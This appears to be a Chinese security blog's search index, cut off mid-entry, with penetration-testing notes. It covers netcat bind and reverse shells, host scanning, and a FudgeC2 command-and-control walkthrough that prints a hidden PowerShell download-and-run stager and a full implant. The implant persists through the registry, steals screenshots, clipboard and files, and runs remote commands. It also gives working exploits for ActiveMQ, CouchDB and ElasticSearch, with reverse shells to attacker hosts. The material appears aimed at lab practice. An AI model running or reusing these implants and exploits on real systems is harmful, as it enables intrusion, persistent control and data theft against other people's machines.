<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NC</title>
      <link href="/NC/"/>
      <url>/NC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-NC"><a href="#0x00-NC" class="headerlink" title="0x00 NC"></a>0x00 NC</h2><p><img src="/NC/1.png" alt></p><h2 id="0x01-NC使用"><a href="#0x01-NC使用" class="headerlink" title="0x01 NC使用"></a>0x01 NC使用</h2><p><strong>扫描</strong></p><pre><code>nc -v ip port #扫描某IP某端口nc -nvv -u -w 2 -z ip port-port #-u：扫描某IP某UDP端口段，-w：延时2秒，-z：关闭输入输出</code></pre><p><strong>监听转发</strong></p><pre><code>nc -l -v -p 8888 #监听本地TCP 8888端口nc -lvp 8888 &gt; 1.txt #重定向到文件1.txt</code></pre><p><strong>正向</strong></p><pre><code>远程nc -lp port -e cmd.exe nc -lp port -e /bin/bash本地nc -nvv ip port</code></pre><p><strong>反向</strong></p><pre><code>远程nc -e /bin/bash ip port本地nc -lvp port</code></pre><p><strong>文件传输</strong></p><pre><code>远程nc -lp port &gt; 1.txt本地nc -vv ip port &lt; /root/1.txt</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> proxy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux之shell脚本</title>
      <link href="/Linux%E4%B9%8Bshell%E8%84%9A%E6%9C%AC/"/>
      <url>/Linux%E4%B9%8Bshell%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h2 id="0x10-Linux扫描存活IP"><a href="#0x10-Linux扫描存活IP" class="headerlink" title="0x10 Linux扫描存活IP"></a>0x10 Linux扫描存活IP</h2><p><strong>一行命令扫存活IP</strong><br><code>for i in 192.168.0.{1..254}; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null; then echo $i is alived; fi; done</code></p><p><strong>ipscan_alive.sh</strong></p><pre><code>#!/bin/bash# ./ipscan_alive.sh 192.168.0NETWORK=$1for HOST in $(seq 1 254)do    ping -c 1 -w 1 $NETWORK.$HOST &amp;&gt;/dev/null &amp;&amp; result=0 || result=1        if [ &quot;$result&quot; == 0 ];then            #echo -e &quot;\033[32;1m$NETWORK.$HOST is up! \033[0m&quot;            echo &quot;$NETWORK.$HOST&quot;        #echo &quot;$NETWORK.$HOST&quot; &gt;&gt; /tmp/Hosts_up.txt        #else            #echo -e &quot;\033[;31m$NETWORK.$HOST is down!\033[0m&quot;        #echo &quot;$NETWORK.$HOST&quot; &gt;&gt; /tmp/Hosts_down.txt    fidone</code></pre><h2 id="0x20-Linux工具扫描存活IP"><a href="#0x20-Linux工具扫描存活IP" class="headerlink" title="0x20 Linux工具扫描存活IP"></a>0x20 Linux工具扫描存活IP</h2><p><strong>nmap</strong><br><code>nmap -sn/Pn/PS/PA/PU/PR/ IP/24 #sn：ping，Pn：禁ping，PS：TCP SYN ping扫描，PA：TCP ACK ping扫描，PU：UDP ping扫描，PR：ARP ping扫描，n：不解析域名，R：解析域名</code></p><p><strong>nbtscan</strong><br><code>nbtscan -r 192.168.0.1/24</code></p><p><strong>netdiscover</strong><br><code>netdiscover -r 192.168.0.1/24 -i eth0</code></p><p><strong>nc</strong><br><code>nc -nvvz ip port-port</code></p><h2 id="0x30-MSF扫描存活IP"><a href="#0x30-MSF扫描存活IP" class="headerlink" title="0x30 MSF扫描存活IP"></a>0x30 MSF扫描存活IP</h2><p><strong>arp扫描模块</strong></p><pre><code>msf5 &gt; use auxiliary/scanner/discovery/arp_sweepmsf5 &gt; set rhosts 192.168.0.1/24 msf5 &gt; set smac 02:00:4C:4F:4F:50 #伪造源MACmsf5 &gt; set shost 192.168.0.100 #伪造源IPmsf5 &gt; run</code></pre><p><strong>meterpreter</strong></p><pre><code>meterpreter &gt; run autoroute -s 192.168.0.1/24 #添加路由meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.0.1/24</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 脚本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Command-And-Control</title>
      <link href="/Command-And-Control/"/>
      <url>/Command-And-Control/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><h2 id="0x10-FudgeC2准备"><a href="#0x10-FudgeC2准备" class="headerlink" title="0x10 FudgeC2准备"></a>0x10 FudgeC2准备</h2><ol><li><a href="https://github.com/Ziconius/FudgeC2" target="_blank" rel="noopener">https://github.com/Ziconius/FudgeC2</a></li><li>git clone <a href="https://github.com/Ziconius/FudgeC2" target="_blank" rel="noopener">https://github.com/Ziconius/FudgeC2</a></li><li>cd FudgeC2/FudgeC2</li><li>pip3 install -r requirements.txt</li><li>python3 Controller.py</li><li>访问<a href="http://IP:5001/，默认账号密码：admin/letmein" target="_blank" rel="noopener">http://IP:5001/，默认账号密码：admin/letmein</a></li><li>FudgeC2 IP：192.168.100.16</li><li>靶机 IP：192.168.100.3</li></ol><h2 id="0x11-FudgeC2使用"><a href="#0x11-FudgeC2使用" class="headerlink" title="0x11 FudgeC2使用"></a>0x11 FudgeC2使用</h2><ol><li><img src="/Command-And-Control/1.png" alt></li><li>Listeners——Create Listener New——Listener Name——Select listener type——Listener Port——Auto-start Listener——Submit</li><li><img src="/Command-And-Control/2.png" alt></li><li>New Campaign——Campaign title——Campaign description——Create campaign</li><li><img src="/Command-And-Control/3.png" alt></li><li><img src="/Command-And-Control/4.png" alt></li><li>Campaigns——可以看到创建的win_2008</li><li><img src="/Command-And-Control/5.png" alt></li><li>Create Implant</li><li><img src="/Command-And-Control/6.png" alt> </li><li><img src="/Command-And-Control/7.png" alt> </li><li>Stagers——Copy Powershell stager</li><li><img src="/Command-And-Control/8.png" alt> </li></ol><pre><code>powershell -windowstyle hidden -exec bypass -c &quot;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;(iwr &#39;http://192.168.100.16:8888/robots.txt?user=80265&#39; -UseBasicParsing)|iex&quot;</code></pre><ol><li>在靶机中powershell执行一下代码</li><li><img src="/Command-And-Control/9.png" alt> </li><li>Active Implant Details——Select Active Implant——复制代码到靶机中powershell执行</li><li><img src="/Command-And-Control/10.png" alt> </li></ol><pre><code>function d_q{ function dpxhhryy ($data) {    $b = $data    $data = $b -split &#39;::&#39;, 2    $name = $data[0].Replace(&quot; &quot;,&quot;&quot;)    $bgt = $data[1]    $b = [ScriptBlock]::Create($bgt)    New-Module -ScriptBlock $b -Name $name -Verbose | Import-Module    $global:tr = Get-Command -Module $name -Verbose}function pymtokvf ($b){    try {        $nuoahfyf = [Convert]::ToBase64String([IO.File]::ReadAllBytes($b))        $global:tr = $nuoahfyf    } catch {        $global:tr = &quot;0&quot;    }}if ($global:gr -eq $null -or $global:gr -eq &quot;&quot;){$global:gr = $MyInvocation.MyCommand.ScriptBlock} function yauvyqse(){    $abc = &quot;HKCU:/Software/Microsoft/Windows/CurrentVersion/Run/&quot;    $def = &quot;HKCU:/Software/Microsoft/Windows/CurrentVersion/WinTrust/Trust Providers/&quot;    $key = Get-Item -LiteralPath $abc -ErrorAction SilentlyContinue    $ec = [System.Convert]::ToBase64String([system.Text.Encoding]::utf8.getbytes($global:gr))    $val = &quot;powershell.exe -win hidden -NonI -c (icm -scriptblock ([scriptblock]::Create([System.Text.Encoding]::utf8.GetString([System.Convert]::FromBase64String((gp &#39;HKCU:\Software\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers&#39;).State)))))&quot;    if ($key.Property -Like &quot;uwcrxmkk&quot;){        $global:tr = &quot;0&quot;    } else {        New-ItemProperty -path $abc -Name uwcrxmkk -Value $val -PropertyType &quot;String&quot; | Out-Null        New-ItemProperty -Path $def -Name State -Value $ec -PropertyType &quot;String&quot; | Out-Null        $global:tr = &quot;1&quot;    }}function BasicHttpProfile_rnd($pohmxyvb){    if ( $pohmxyvb -eq $null ){        $URL = &quot;http://&quot;+$cinwweve+&quot;:8888/index&quot;        $r = iwr -uri $URL -headers @{&quot;X-Implant&quot; = &quot;639216&quot;} -method &#39;GET&#39; -UseBasicParsing        $global:headers = $r.Content    } else {        $URL = &quot;http://&quot;+$cinwweve+&quot;:8888/help&quot;        $enc = [system.Text.Encoding]::UTF8        $data2 = [System.Convert]::ToBase64String($enc.GetBytes($pohmxyvb))        $data2 = $global:command_id+$data2        $r = iwr -uri $URL -method &#39;POST&#39; -headers @{&quot;X-Result&quot;= &quot;639216&quot;} -body $data2 -UseBasicParsing        $global:headers = $r.Content    }}function yjysjxgm(){    $h = hostname    $d = (Get-WmiObject -Class Win32_ComputerSystem).Workgroup    $a = (Test-Connection -ComputerName (hostname) -Count 1).IPV4Address    $final_str = &quot;Username: &quot;+$env:UserName+&quot;`nHostname: &quot;+$h+&quot;`nDomain: &quot;+$d+&quot;`nLocal IP: &quot;+$a    $global:tr = $final_str}function jhnagycw ($b) {    try {         $c = $b.split(&quot;::&quot;)        $fn = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c[0].ToString()))        $fc = [System.Convert]::FromBase64String($c[2].ToString())        $fc | Set-Content &quot;$fn&quot; -encoding Byte -NoNewLine        $global:tr = 1    } catch {         $global:tr = 0     } }function dqyctuzp (){    [Reflection.Assembly]::LoadWithPartialName(&quot;System.Drawing&quot;) | out-nUll    [void] [System.Reflection.Assembly]::LoadWithPartialName(&quot;System.Drawing&quot;)     [void] [System.Reflection.Assembly]::LoadWithPartialName(&quot;System.Windows.Forms&quot;)     $width = 0;    $height = 0;    $workingAreaX = 0;    $workingAreaY = 0;    $screen = [System.Windows.Forms.Screen]::AllScreens;    foreach ($item in $screen)    {        if($workingAreaX -gt $item.WorkingArea.X) { $workingAreaX = $item.WorkingArea.X; }        if($workingAreaY -gt $item.WorkingArea.Y) { $workingAreaY = $item.WorkingArea.Y; }        $width = $width + $item.Bounds.Width;        if($item.Bounds.Height -gt $height) { $height = $item.Bounds.Height; }    }    $bounds = [Drawing.Rectangle]::FromLTRB($workingAreaX, $workingAreaY, $width, $height);     $bmp = New-Object Drawing.Bitmap $width, $height;    $graphics = [Drawing.Graphics]::FromImage($bmp);    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size);    $fs = New-Object IO.MemoryStream    $bmp.Save($fs, &quot;Png&quot;)    $global:tr = [System.Convert]::ToBase64String($fs.ToArray())    $graphics.Dispose();    $bmp.Dispose();}function smbnmovf () {    $global:tr = Get-Command | Where {$_.Source -Like &quot;FC2&quot;}}function ntbdllxr($data){    if ($data.length -lt 4){            $global:tr = 0        }    $wshShell = new-object -com wscript.shell;1..50  | % {$wshShell.SendKeys([char]175)}    $fs = [System.IO.MemoryStream]::new($data)    $PlayWav = [System.Media.SoundPlayer]::new($fs)    $PlayWav.play()    $PlayWav.Dispose()    $global:tr = 1}function mbbvxlsh($data){    $a = $data.Substring(0,2)    $global:command_id = $data.Substring(2,24)    if ($data.Substring(26).length -gt 1){        $b = [System.Convert]::FromBase64String($data.Substring(26))    }    if($a -eq &quot;CM&quot;){        $c = [System.Convert]::ToBase64String([system.Text.Encoding]::Unicode.getbytes([System.Text.Encoding]::UTF8.GetString($b)))        $global:tr = powershell.exe -exec bypass -EncodedCommand $c    } elseif($a -eq &quot;SI&quot;){        yjysjxgm    } elseif ($a -eq &quot;EP&quot;){        yauvyqse    } elseif ($a -eq &quot;PS&quot;){        ntbdllxr($b)    } elseif ($a -eq &quot;EC&quot;){         bvqajszl     } elseif ($a -eq &quot;LM&quot;){        dpxhhryy([System.Text.Encoding]::UTF8.GetString($b))    } elseif ($a -eq &quot;IM&quot;){        iufvzyzw([System.Text.Encoding]::UTF8.GetString($b))    } elseif ($a -eq &quot;ML&quot;){        smbnmovf      } elseif ($a -eq &quot;FD&quot;){        pymtokvf([System.Text.Encoding]::UTF8.GetString($b))    } elseif ($a -eq &quot;UF&quot;){        jhnagycw([System.Text.Encoding]::UTF8.GetString($b))    } elseif ($a -eq &quot;SC&quot;){        dqyctuzp    } else {        $global:tr = $null    }}function tmwzeeao($b){qiwrkrfq    cndzragd    sleep (Get-Random -Minimum ($gxeexket *0.90) -Maximum ($gxeexket *1.10))    return get-random($b)}function qiwrkrfq(){    while ($true){        $start_string = &quot;00:00:00&quot;        $stop_string =  &quot;01:00:00&quot;        $start = [datetime]::parseexact($start_string, &#39;HH:mm:ss&#39;, $null)        $stop = [datetime]::parseexact($stop_string, &#39;HH:mm:ss&#39;, $null)        if ($start -lt $stop){            if( ( (get-date) -ge $start ) -And ((get-date) -le $stop) ){              return }        } else {            $stop = $stop.AddDays(1)            if ( ((get-date) -lt $stop) -And ((Get-Date) -gt $start ) ) {                 return            }        }        start-sleep(3);    }}function bvqajszl() {    $b = &quot;Text&quot;    $a = Get-Clipboard -Format $b    if ($a -ne $null ){$global:tr = $a}    else {$global:tr = &quot;0&quot;}}function iufvzyzw ($data) {    $global:tr = invoke-expression &quot;$data&quot;} function cndzragd{    $kd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(&quot;MjAyMC0wNy0wMiAwMTowMDowMA==&quot;))    $pdt = [datetime]::parseexact($kd, &#39;yyyy-MM-dd HH:mm:ss&#39;, $null)    if ((Get-Date) -gt ($pdt)){        [string]::join(&#39;&#39;,[ChaR[]](101, 120, 105, 116)) |&amp; ((gv ‘*MDr*’).NamE[3,11,2] -join &#39;&#39;)    }  }$IVM=&quot;Y&quot;;$fLz=&quot;8&quot;;$xLc=&quot;1&quot;;$NLY=&quot;6&quot;;$cOg=&quot;2&quot;;$PfB=&quot;0&quot;;$PPA=&quot;L&quot;;$hkl=&quot;.&quot;;$MnR=&quot;.&quot;;$UJM=&quot;q&quot;;$Zod=&quot;m&quot;;$VSy=&quot;k&quot;;$AIU=&quot;q&quot;;$jWQ=&quot;1&quot;;$fIN=&quot;6&quot;;$gQe=&quot;9&quot;;$Zsy=&quot;1&quot;;$zxM=&quot;1&quot;;$MRV=&quot;r&quot;;$Nwq=&quot;Y&quot;;$bmI=&quot;.&quot;;$NbQ=&quot;g&quot;;$qOX=&quot;0&quot;;$aac=&quot;r&quot;;$global:command_id = 0start-sleep(2)$gxeexket=4$cinwweve = &quot;$jWQ$gQe$cOg$hkl$zxM$fIN$fLz$bmI$xLc$PfB$qOX$MnR$Zsy$NLY&quot;while($true){    $plh=$null    $global:headers = $null    try {    switch ( tmwzeeao(1)) {     0 { BasicHttpProfile_rnd($plh) }}    } catch {        $_.Exception | Out-Null    }    if (($global:headers -NotLike &quot;==&quot;) -And ($global:headers -ne $null)){        mbbvxlsh($global:headers)        if ($global:tr -ne $null){             $atr = $global:tr -join &quot;`n&quot;            $plh = $atr            try {            switch ( tmwzeeao(1)) {     0 { BasicHttpProfile_rnd($plh) }}            } catch {                $_.Exception | Out-Null            }        }           }} };d_q</code></pre><ol><li><img src="/Command-And-Control/11.png" alt> </li><li><img src="/Command-And-Control/12.png" alt> </li><li><img src="/Command-And-Control/13.png" alt></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> C2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞记录</title>
      <link href="/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"/>
      <url>/%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞记录"><a href="#漏洞记录" class="headerlink" title="漏洞记录"></a>漏洞记录</h2><p><a href="#CVE-2015-5254">ActiveMQ 反序列化漏洞（CVE-2015-5254）</a><br>ActiveMQ 任意文件写入漏洞（CVE-2016-3088）<br>CouchDB CVE-2017-12635垂直权限绕过 CVE-2017-12636任意命令执行<br>docker 未授权访问<br>ElasticSearch 未授权访问漏洞<br>ElasticSearch 命令执行漏洞（CVE-2014-3120）<br>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）<br><a href="#F5_BIG-IP">F5 BIG-IP 远程代码执行漏洞poc exp（CVE-2020-5902）</a><br>Hadoop YARN ResourceManager 未授权访问<br>LDAP 未授权访问<br>Memcache 未授权漏洞<br>MongoDB 未授权访问<br>NFS 未授权访问<br>office宏攻击<br>OpenSSH 用户名枚举漏洞（CVE-2018-15473）<br>rsync 未授权访问漏洞<br>Samba 远程代码执行漏洞（CVE-2015-0240）<br>Samba 远程命令执行漏洞（CVE-2017-7494）<br>ZooKeeper 未授权访问</p><hr><h2 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a><span id="CVE-2015-5254">ActiveMQ 反序列化漏洞（CVE-2015-5254）</span></h2><ol><li>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</li><li>端口：</li><li><ul><li>61616：</li></ul></li><li><ul><li>8161：web控制台端口（漏洞所在处）</li></ul></li><li><a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md</a></li></ol><hr><h2 id="ActiveMQ-任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ-任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ 任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ 任意文件写入漏洞（CVE-2016-3088）</h2><ol><li>ActiveMQ控制台，分三个应用：admin、api和fileserver，admin是管理员页面，api是接口，fileserver是存储文件的接口。admin和api需要登录才能使用，fileserver无需登录。</li><li>端口：</li><li><ul><li>61616：</li></ul></li><li><ul><li>8161：web控制台端口（漏洞所在处）</li></ul></li></ol><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol><li>问题出现在fileserver，fileserver支持写入文件（PUT方法）且支持移动文件（MOVE请求），但不解析，所以这里上传文件再移动文件位置，即可造成任意文件写入漏洞。</li><li>可写入：</li><li><ul><li>webshell（简单方便，但需要登录）</li></ul></li><li><ul><li>cron文件（方便，可直接反弹shell，但需要root权限）</li></ul></li><li><ul><li>ssh key文件（方便，可直接登录，但需要root权限）</li></ul></li><li><ul><li>jar文件（麻烦且需要jar后门）</li></ul></li><li><ul><li>jetty.xml文件（可靠，需要绝对路径）</li></ul></li><li>等等</li><li><strong>例子1：</strong></li><li>默认账号密码：admin/admin</li><li>访问 <a href="http://your-ip:8161/admin/test/systemProperties.jsp" target="_blank" rel="noopener">http://your-ip:8161/admin/test/systemProperties.jsp</a> #查看ActiveMQ的绝对路径</li><li>写入文件（回显204，说明成功）：</li></ol><pre><code>PUT /fileserver/test.txt HTTP/1.1Host: IP:8161...webshell...</code></pre><ol><li>移动文件（回显204，说明成功）：</li></ol><pre><code>MOVE /fileserver/test.txt HTTP/1.1Destination: file:///opt/activemq/webapps/api/test.jspHost: IP:8161...</code></pre><ol><li>访问webshell（需要登录）</li><li><strong>例子2：</strong></li><li>写入计划任务</li></ol><pre><code>PUT /fileserver/cron.txt HTTP/1.1Host: IP:8161...*/1 * * * * root /usr/bin/perl -e &#39;use Socket;$i=&quot;attacker_IP&quot;;$p=attacker_port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;</code></pre><ol><li>移动到计划任务中</li></ol><pre><code>MOVE /fileserver/cron.txt HTTP/1.1Destination: file:///etc/cron.d/rootHost: IP:8161...</code></pre><ol><li>Linux：nc -lvp attacker_port</li><li>Windows Nmap: ncat -lvp attacker_port</li></ol><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ol><li>5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（可以在conf/jetty.xml中开启之）</li><li>在5.14.0版本以后，彻底删除了fileserver应用。</li></ol><p><a href="https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md</a></p><hr><h2 id="CouchDB-CVE-2017-12635垂直权限绕过-CVE-2017-12636任意命令执行"><a href="#CouchDB-CVE-2017-12635垂直权限绕过-CVE-2017-12636任意命令执行" class="headerlink" title="CouchDB CVE-2017-12635垂直权限绕过 CVE-2017-12636任意命令执行"></a>CouchDB CVE-2017-12635垂直权限绕过 CVE-2017-12636任意命令执行</h2><ol><li>CouchDB是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库，2017年时被爆出了2个CVE。</li><li>端口：5984</li></ol><h3 id="CVE-2017-12635垂直权限绕过"><a href="#CVE-2017-12635垂直权限绕过" class="headerlink" title="CVE-2017-12635垂直权限绕过"></a>CVE-2017-12635垂直权限绕过</h3><ol><li>发送如下数据包，即可成功创建管理员用户，账号密码都是vulhub，<a href="http://IP:5984/_utils/" target="_blank" rel="noopener">http://IP:5984/_utils/</a></li></ol><pre><code>PUT /_users/org.couchdb.user:vulhub HTTP/1.1Host: IP:5984Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 108{  &quot;type&quot;: &quot;user&quot;,  &quot;name&quot;: &quot;vulhub&quot;,  &quot;roles&quot;: [&quot;_admin&quot;],  &quot;roles&quot;: [],  &quot;password&quot;: &quot;vulhub&quot;}</code></pre><h3 id="CVE-2017-12636任意命令执行"><a href="#CVE-2017-12636任意命令执行" class="headerlink" title="CVE-2017-12636任意命令执行"></a>CVE-2017-12636任意命令执行</h3><ol><li>Couchdb 2.x和1.x的API接口有一定区别，所以这个漏洞的利用方式也不同。使用以下exp，修改其中的target和command为你的测试机器，然后修改version为对应的Couchdb版本（1或2），可成功反弹shell。</li></ol><pre><code>#!/usr/bin/env python3import requestsimport jsonimport base64from requests.auth import HTTPBasicAuthtarget = &#39;http://your-ip:5984&#39;command = rb&quot;&quot;&quot;sh -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1&quot;&quot;&quot;version = 1session = requests.session()session.headers = {    &#39;Content-Type&#39;: &#39;application/json&#39;}# session.proxies = {#     &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;# }session.put(target + &#39;/_users/org.couchdb.user:wooyun&#39;, data=&#39;&#39;&#39;{  &quot;type&quot;: &quot;user&quot;,  &quot;name&quot;: &quot;wooyun&quot;,  &quot;roles&quot;: [&quot;_admin&quot;],  &quot;roles&quot;: [],  &quot;password&quot;: &quot;wooyun&quot;}&#39;&#39;&#39;)session.auth = HTTPBasicAuth(&#39;wooyun&#39;, &#39;wooyun&#39;)command = &quot;bash -c &#39;{echo,%s}|{base64,-d}|{bash,-i}&#39;&quot; % base64.b64encode(command).decode()if version == 1:    session.put(target + (&#39;/_config/query_servers/cmd&#39;), data=json.dumps(command))else:    host = session.get(target + &#39;/_membership&#39;).json()[&#39;all_nodes&#39;][0]    session.put(target + &#39;/_node/{}/_config/query_servers/cmd&#39;.format(host), data=json.dumps(command))session.put(target + &#39;/wooyun&#39;)session.put(target + &#39;/wooyun/test&#39;, data=&#39;{&quot;_id&quot;: &quot;wooyuntest&quot;}&#39;)if version == 1:    session.post(target + &#39;/wooyun/_temp_view?limit=10&#39;, data=&#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39;)else:    session.put(target + &#39;/wooyun/_design/test&#39;, data=&#39;{&quot;_id&quot;:&quot;_design/test&quot;,&quot;views&quot;:{&quot;wooyun&quot;:{&quot;map&quot;:&quot;&quot;} },&quot;language&quot;:&quot;cmd&quot;}&#39;)</code></pre><hr><h2 id="docker-未授权访问"><a href="#docker-未授权访问" class="headerlink" title="docker 未授权访问"></a>docker 未授权访问</h2><ol><li>该未授权访问漏洞是因为docker remote api可以执行docker命令，该接口的目的是取代docker命令界面，通过url操作docker。docker swarm是用来管理docker集群的，在开放2375端口监听集群容器时，会调用这个api。</li><li><a href="https://github.com/Tycx2ry/docker_api_vul" target="_blank" rel="noopener">https://github.com/Tycx2ry/docker_api_vul</a></li></ol><pre><code>docker 未授权访问漏洞利用脚本##安装类库pip install -r requirements.txt##查看运行的容器python dockerRemoteApiGetRootShell.py -h IP -p 2375##查看所有的容器python dockerRemoteApiGetRootShell.py -h IP -p 2375 -a##查看所有镜像python dockerRemoteApiGetRootShell.py -h IP -p 2375 -l##查看端口映射python dockerRemoteApiGetRootShell.py -h IP -p 2375 -L##写计划任务（centos,redhat等,加-u参数用于ubuntu等）python dockerRemoteApiGetRootShell.py -h IP -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口python dockerRemoteApiGetRootShell.py -h IP -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口##写sshkey(自行修改脚本的中公钥)python dockerRemoteApiGetRootShell.py -h IP -p 2375 -C -i 镜像名 -k##在容器中执行命令python dockerRemoteApiGetRootShell.py -h IP -p 2375 -e &quot;id&quot; -I 容器id##删除容器python dockerRemoteApiGetRootShell.py -h IP -p 2375 -c -I 容器id##修改client api版本python dockerRemoteApiGetRootShell.py -h IP -p 2375 -v 1.22##查看服务端api版本python dockerRemoteApiGetRootShell.py -h IP -p 2375 -V</code></pre><hr><h2 id="ElasticSearch-未授权访问漏洞"><a href="#ElasticSearch-未授权访问漏洞" class="headerlink" title="ElasticSearch 未授权访问漏洞"></a>ElasticSearch 未授权访问漏洞</h2><ol><li>Elasticsearch是用Java开发的企业级搜索引擎，默认端口9200，存在未授权访问漏洞时，可被非法操作数据。</li><li>目录穿越漏洞（CVE-2015-3337）<a href="https://vulhub.org/#/environments/elasticsearch/CVE-2015-3337/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/CVE-2015-3337/</a></li><li>目录穿越漏洞（CVE-2015-5531）<a href="https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/</a></li><li>写入webshell漏洞（WooYun-2015-110216）<a href="https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/WooYun-2015-110216/</a></li></ol><pre><code>http://IP:9200/_plugin/head/  web管理界面burpsuite重放：http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwdhttp://IP:9200/_cat/indices  查看集群当前状态http://IP:9200/_nodes  查看节点数据http://IP:9200/_river/_search  查看数据库敏感信息</code></pre><hr><h2 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）</h2><ol><li><a href="https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/CVE-2014-3120/</a></li><li>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</li></ol><pre><code>POST /website/blog/ HTTP/1.1Host: IP:9200...{    &quot;name&quot;:&quot;test&quot;}</code></pre><ol><li>执行命令</li></ol><pre><code>POST /_search?pretty HTTP/1.1Host: IP:9200...{    &quot;size&quot;: 1,    &quot;query&quot;: {      &quot;filtered&quot;: {        &quot;query&quot;: {          &quot;match_all&quot;: {          }        }      }    },    &quot;script_fields&quot;: {        &quot;command&quot;: {            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;        }    }}</code></pre><hr><h2 id="ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）"><a href="#ElasticSearch-Groovy-沙盒绕过-amp-amp-代码执行漏洞（CVE-2015-1427）" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）</h2><ol><li>端口：9200</li><li><a href="https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/" target="_blank" rel="noopener">https://vulhub.org/#/environments/elasticsearch/CVE-2015-1427/</a></li><li>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</li></ol><pre><code>POST /website/blog/ HTTP/1.1Host: IP:9200...{    &quot;name&quot;:&quot;test&quot;}</code></pre><ol><li>再发送payload执行命令</li></ol><pre><code>POST /_search?pretty HTTP/1.1Host: IP:9200...{&quot;size&quot;:1, &quot;script_fields&quot;: {&quot;lupin&quot;:{&quot;lang&quot;:&quot;groovy&quot;,&quot;script&quot;: &quot;java.lang.Math.class.forName(\&quot;java.lang.Runtime\&quot;).getRuntime().exec(\&quot;id\&quot;).getText()&quot;}}}</code></pre><hr><h2 id="F5-BIG-IP-远程代码执行漏洞poc-exp（CVE-2020-5902）"><a href="#F5-BIG-IP-远程代码执行漏洞poc-exp（CVE-2020-5902）" class="headerlink" title="F5 BIG-IP 远程代码执行漏洞poc exp（CVE-2020-5902）"></a><span 